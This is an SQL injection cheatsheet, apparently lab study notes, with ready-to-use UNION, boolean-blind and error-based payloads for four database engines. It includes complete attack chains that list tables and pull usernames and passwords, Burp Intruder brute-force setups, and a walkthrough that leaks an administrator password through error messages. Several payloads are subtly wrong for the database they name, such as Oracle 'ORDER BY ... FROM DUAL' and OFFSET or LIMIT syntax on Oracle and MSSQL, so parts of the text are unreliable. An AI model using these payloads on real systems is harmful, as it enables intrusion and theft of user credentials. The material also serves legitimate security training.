# SQL Injection UNION Attack Cheatsheet (All Databases)

## **1. Determine Number of Columns**

### **Method 1: ORDER BY**
```sql
-- PostgreSQL, MySQL, MSSQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--

-- Oracle
' ORDER BY 1 FROM DUAL--
' ORDER BY 2 FROM DUAL--
' ORDER BY 3 FROM DUAL--
```

### **Method 2: UNION SELECT NULL**
```sql
-- PostgreSQL, MySQL, MSSQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--

-- Oracle
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

---

## **2. Find String-Compatible Columns**

```sql
-- PostgreSQL, MySQL, MSSQL
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Oracle
' UNION SELECT 'a',NULL,NULL FROM DUAL--
' UNION SELECT NULL,'a',NULL FROM DUAL--
' UNION SELECT NULL,NULL,'a' FROM DUAL--
```

---

## **3. Retrieve Database Version**

#### **PostgreSQL:**
```sql
' UNION SELECT version(),NULL,NULL--
' UNION SELECT NULL,version(),NULL--
```

#### **MySQL:**
```sql
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT version(),NULL,NULL--
```

#### **Microsoft SQL Server:**
```sql
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT NULL,@@version,NULL--
```

#### **Oracle:**
```sql
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT NULL,banner FROM v$version--
' UNION SELECT version,NULL FROM v$instance--
```

---

## **4. List All Tables**

#### **PostgreSQL:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,table_name FROM information_schema.tables--
' UNION SELECT table_name,table_schema FROM information_schema.tables--
```

#### **MySQL:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,table_schema FROM information_schema.tables--
```

#### **Microsoft SQL Server:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
```

#### **Oracle:**
```sql
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT table_name,owner FROM all_tables--
```

---

## **5. List Columns for Specific Table**

#### **PostgreSQL:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--
```

#### **MySQL:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()--
```

#### **Microsoft SQL Server:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--
```

#### **Oracle:**
```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name='USERS'--
```

---

## **6. Extract Data from Tables**

### **When you have multiple string columns:**
```sql
-- PostgreSQL, MySQL, MSSQL
' UNION SELECT username,password FROM users--
' UNION SELECT username,password FROM users WHERE username='administrator'--
```

### **When you only have one string column:**
```sql
-- PostgreSQL
' UNION SELECT NULL,username||':'||password FROM users--
' UNION SELECT NULL,CONCAT(username,':',password) FROM users--

-- MySQL
' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
' UNION SELECT NULL,CONCAT_WS(':',username,password) FROM users--

-- MSSQL
' UNION SELECT NULL,username+':'+password FROM users--

-- Oracle
' UNION SELECT NULL,username||':'||password FROM users--
```

---

## **7. Database-Specific Queries**

### **Current Database Name:**
```sql
-- PostgreSQL
' UNION SELECT current_database(),NULL--

-- MySQL
' UNION SELECT database(),NULL--

-- MSSQL
' UNION SELECT db_name(),NULL--

-- Oracle
' UNION SELECT name,NULL FROM v$database--
```

### **Current User:**
```sql
-- PostgreSQL, MySQL
' UNION SELECT user(),NULL--

-- MSSQL
' UNION SELECT user_name(),NULL--
' UNION SELECT suser_name(),NULL--

-- Oracle
' UNION SELECT user,NULL FROM DUAL--
```

---

## **8. Complete Attack Examples**

### **Example 1: Full Attack on PostgreSQL**
```sql
-- Find columns
' UNION SELECT NULL,NULL--

-- Check string columns
' UNION SELECT 'a','b'--

-- Get version
' UNION SELECT version(),NULL--

-- List tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- List columns from users table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Get credentials
' UNION SELECT username,password FROM users--
```

### **Example 2: Full Attack on MySQL**
```sql
-- Find columns
' UNION SELECT NULL,NULL--

-- Check string columns
' UNION SELECT 'a','b'--

-- Get version
' UNION SELECT @@version,NULL--

-- List tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- List columns from users table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()--

-- Get credentials
' UNION SELECT username,password FROM users--
```

### **Example 3: Full Attack on Oracle**
```sql
-- Find columns
' UNION SELECT NULL,NULL FROM DUAL--

-- Check string columns
' UNION SELECT 'a','b' FROM DUAL--

-- Get version
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--

-- List tables
' UNION SELECT table_name,NULL FROM all_tables WHERE owner=(SELECT user FROM DUAL)--

-- List columns from users table
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- Get credentials
' UNION SELECT username,password FROM users--
```

---

## **9. Quick Reference - Database Detection**

```sql
-- If this works, it's PostgreSQL/MySQL/MSSQL:
' UNION SELECT NULL--

-- If you need this, it's Oracle:
' UNION SELECT NULL FROM DUAL--

-- If you see these errors:
-- PostgreSQL: "column does not exist"
-- MySQL: "Unknown column"
-- MSSQL: "Invalid column name"
-- Oracle: "invalid identifier"
```

---

## **10. Important Notes**

- **Oracle**: Table names are **UPPERCASE** by default
- **MySQL**: Database name is case-sensitive on Linux
- **PostgreSQL**: Use `'public'` schema for most applications
- **MSSQL**: May need to handle XML output for some queries

## **Payload Encoding for HTTP Requests**
```
Space: + or %20
Single quote: %27
Double quote: %22
Comment: --+ or %23
```

This cheatsheet covers all major databases for UNION-based SQL injection attacks!

# COMPLETE BLIND SQL INJECTION GUIDE

## **Initial Detection Methods**

### **1. Confirm Blind SQLi Vulnerability**

#### **Boolean-Based Detection:**
```sql
Cookie: TrackingId=xyz' AND '1'='1  -- Returns welcome message
Cookie: TrackingId=xyz' AND '1'='2  -- No welcome message (confirms blind SQLi)
```

#### **Error-Based Detection:**
```sql
-- Test for errors
TrackingId=xyz'  -- Check if error appears
TrackingId=xyz'||(SELECT '')||'  -- Test concatenation

-- Database-specific error testing
TrackingId=xyz'||(SELECT '' FROM dual)||'  -- Oracle test
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'  -- Should cause error
```

---

## **Database Identification**

### **Version Detection (Boolean-Based):**
```sql
-- PostgreSQL
TrackingId=xyz' AND (SELECT version()) IS NOT NULL--

-- MySQL / Microsoft SQL Server  
TrackingId=xyz' AND (SELECT @@version) IS NOT NULL--

-- Oracle
TrackingId=xyz' AND (SELECT * FROM v$version) IS NOT NULL--
```

### **Version Detection (Error-Based):**
```sql
-- PostgreSQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT version()) IS NOT NULL THEN TO_CHAR(1/0) ELSE '' END)||'

-- MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT @@version) IS NOT NULL THEN CAST(1/0 AS UNSIGNED) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT @@version) IS NOT NULL THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

---

## **Table & Column Verification**

### **Boolean-Based Verification:**
```sql
-- Check if users table exists
TrackingId=xyz' AND (SELECT COUNT(*) FROM users) > 0--
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--

-- Check for specific user
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
TrackingId=xyz' AND (SELECT username FROM users WHERE ROWNUM=1)='administrator'--
```

### **Error-Based Verification:**
PostgreSQL:
sql
-- Check if users table exists
TrackingId=xyz'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN CAST(1/0 AS TEXT) ELSE '' END)||'
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users) THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- Check for specific user
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN CAST(1/0 AS TEXT) ELSE '' END)||'
MySQL:
sql
-- Check if users table exists
TrackingId=xyz'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users) THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'

-- Check for specific user
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'
Microsoft SQL Server:
sql
-- Check if users table exists
TrackingId=xyz'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users) THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Check for specific user
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'
Oracle (Your Original):
sql
-- Check if users table exists
TrackingId=xyz'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'

-- Check for specific user
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'


---

## **COMPLETE ATTACK STEPS**

### **Step 1: Find Database Name (Character by Character)**

#### **Boolean-Based:**
```sql
-- PostgreSQL
TrackingId=xyz' AND (SELECT SUBSTRING(current_database(),§1§,1))='§a§'--

-- MySQL
TrackingId=xyz' AND (SELECT SUBSTRING(database(),§1§,1))='§a§'--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT SUBSTRING(db_name(),§1§,1))='§a§'--

-- Oracle
TrackingId=xyz' AND (SELECT SUBSTR(global_name,§1§,1) FROM global_name WHERE rownum=1)='§a§'--
```

#### **Error-Based:**
```sql
-- PostgreSQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(current_database(),§1§,1))='§a§' THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(database(),§1§,1))='§a§' THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(db_name(),§1§,1))='§a§' THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTR(global_name,§1§,1) FROM global_name WHERE rownum=1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Cluster bomb with positions 1-20 and a-z,0-9,_

---

### **Step 2: Find All Tables (Character by Character)**

#### **Boolean-Based:**
```sql
-- PostgreSQL
TrackingId=xyz' AND (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §2§)='§a§'--

-- MySQL
TrackingId=xyz' AND (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET §2§)='§a§'--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_catalog=db_name() LIMIT 1 OFFSET §2§)='§a§'--

-- Oracle
TrackingId=xyz' AND (SELECT SUBSTR(table_name,§1§,1) FROM all_tables WHERE owner=(SELECT user FROM dual) AND rownum=1 OFFSET §2§)='§a§'--
```

#### **Error-Based:**
```sql
-- PostgreSQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §2§)='§a§' THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET §2§)='§a§' THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_catalog=db_name() LIMIT 1 OFFSET §2§)='§a§' THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTR(table_name,§1§,1) FROM all_tables WHERE owner=(SELECT user FROM dual) AND rownum=1 OFFSET §2§)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Cluster bomb with positions 1-20, 0-10, and a-z,0-9,_

---

### **Step 3: Find Columns for Specific Table**

#### **Boolean-Based:**
```sql
-- PostgreSQL
TrackingId=xyz' AND (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §2§)='§a§'--

-- MySQL
TrackingId=xyz' AND (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 1 OFFSET §2§)='§a§'--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §2§)='§a§'--

-- Oracle
TrackingId=xyz' AND (SELECT SUBSTR(column_name,§1§,1) FROM all_tab_columns WHERE table_name='USERS' AND rownum=1 OFFSET §2§)='§a§'--
```

#### **Error-Based:**
```sql
-- PostgreSQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §2§)='§a§' THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 1 OFFSET §2§)='§a§' THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §2§)='§a§' THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTR(column_name,§1§,1) FROM all_tab_columns WHERE table_name='USERS' AND rownum=1 OFFSET §2§)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Cluster bomb with positions 1-20, 0-10, and a-z,0-9,_

---

### **Step 4: Find Password Length**

#### **Boolean-Based:**
```sql
-- PostgreSQL & MySQL
TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT LEN(password) FROM users WHERE username='administrator')=§1§--

-- Oracle
TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§--
```

#### **Error-Based:**
```sql
-- PostgreSQL & MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§ THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT LEN(password) FROM users WHERE username='administrator')=§1§ THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§ THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Sniper with numbers 1-50

---

### **Step 5: Extract Password Character by Character**

#### **Boolean-Based:**
```sql
-- PostgreSQL & MySQL
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--

-- Oracle
TrackingId=xyz' AND (SELECT SUBSTR(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
```

#### **Error-Based:**
```sql
-- PostgreSQL & MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§' THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§' THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTR(password,§1§,1) FROM users WHERE username='administrator')='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Cluster bomb with positions 1-20 and a-z,0-9

---

## **Comparison Operators for Blind SQLi**

### **Boolean-Based Character Comparison:**
```sql
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm'--
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) < 't'--
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) = 's'--
```

### **Error-Based Character Comparison:**
```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm' THEN TO_CHAR(1/0) ELSE '' END)||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) < 't' THEN TO_CHAR(1/0) ELSE '' END)||'
```

---

## **Burp Intruder Optimization**

### **For Boolean-Based:**
- **Grep Match:** "Welcome back" or success indicator
- **Attack Type:** Cluster bomb
- **Payloads:** 
  - Numbers: 1-20 (positions)
  - Numbers: 0-10 (offsets) 
  - Characters: a-z, 0-9, _

### **For Error-Based:**
- **Filter:** HTTP 500 status codes
- **Grep Match:** Specific error messages
- **Attack Type:** Cluster bomb
- **Payloads:** Same as above

### **Detection Methods:**
1. **Boolean:** Look for different response content/length
2. **Error:** Look for HTTP 500 errors or error messages
3. **Time-Based:** Add delays for time-based detection

---

## **Quick Reference - Database Functions**

| Operation | PostgreSQL | MySQL | MSSQL | Oracle |
|-----------|------------|-------|-------|--------|
| **Substring** | SUBSTRING() | SUBSTRING() | SUBSTRING() | SUBSTR() |
| **Length** | LENGTH() | LENGTH() | LEN() | LENGTH() |
| **Concatenation** | `||` | CONCAT() | `+` | `||` |
| **Error Trigger** | CAST(1/0 AS TEXT) | EXTRACTVALUE() | CAST(1/0 AS VARCHAR) | TO_CHAR(1/0) |
| **Current DB** | current_database() | database() | db_name() | global_name |

This comprehensive guide now includes BOTH boolean-based and error-based blind SQL injection methods for all major databases!

## visible error based sql injection and for char number limiting case
TrackingId=ogAZZfxtOKUELbuJ'                                                      -->error msg unclosed single quote means vulnerable to sql injec
TrackingId=ogAZZfxtOKUELbuJ'--                                                    -->comfirm no error
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--                        -->error msg AND condition must be a boolean expression.
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--                      -->comfirm no error add up to que for useful info 
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--    -->error msg Notice that your query now appears to be truncated due to a character limit.  so remove the trackID
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--                    -->error msg because it unexpectedly returned more than one row.
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--            -->error msg now leaks first username from users table ERROR: invalid input syntax for type integer: "administrator"
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--            -->Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:

Log in as administrator using the stolen password to solve the lab.
